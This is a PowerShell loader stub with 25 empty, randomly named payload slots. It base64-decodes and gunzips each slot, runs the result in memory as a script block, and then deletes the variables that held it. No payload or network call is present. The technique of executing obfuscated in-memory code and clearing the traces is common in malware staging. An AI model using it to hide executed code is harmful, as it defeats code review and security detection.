$Surceasing = ""
$Redemption = ""
$Transitted = ""
$Chesterton = ""
$Desolating = ""
$Panamanian = ""
$Surfeiting = ""
$Redirected = ""
$Transpired = ""
$Chihuahuas = ""
$Despatched = ""
$Paracelsus = ""
$Splashdown = ""
$Surprising = ""
$Redounding = ""
$Transverse = ""
$Chimborazo = ""
$Despicable = ""
$Paramaribo = ""
$Splintered = ""
$Robitussin = ""
$Decomposes = ""
$Cataclysms = ""
$Sweltering = ""
$Swellheads = ""

$Modules = @($Surceasing,$Redemption,$Transitted,$Chesterton,$Desolating,$Panamanian,$Surfeiting,$Redirected,$Transpired,$Chihuahuas,$Despatched,$Paracelsus,$Splashdown,$Surprising,$Redounding,$Transverse,$Chimborazo,$Despicable,$Paramaribo,$Splintered,$Robitussin,$Decomposes,$Cataclysms,$Sweltering,$Swellheads)
$Modules | ForEach-Object {
    $Decoded = [System.Convert]::FromBase64String($_)
    if ($_ -like "H4s*") {
        $Decoded = ConvertFrom-Gzip -Bytes $Decoded
    }
    else {
        $Decoded = [Text.Encoding]::UTF8.GetString($Decoded)
    }
    $ScriptBlock = $ExecutionContext.InvokeCommand.NewScriptBlock($Decoded)
    . $ScriptBlock
    Remove-Variable -Name "Decoded"
    Remove-Variable -Name "ScriptBlock"
}
Remove-Variable -Name "Modules"
@("Surceasing","Redemption","Transitted","Chesterton","Desolating","Panamanian","Surfeiting","Redirected","Transpired","Chihuahuas","Despatched","Paracelsus","Splashdown","Surprising","Redounding","Transverse","Chimborazo","Despicable","Paramaribo","Splintered","Robitussin","Decomposes","Cataclysms","Sweltering","Swellheads") | ForEach-Object { Remove-Variable -Name $_ }
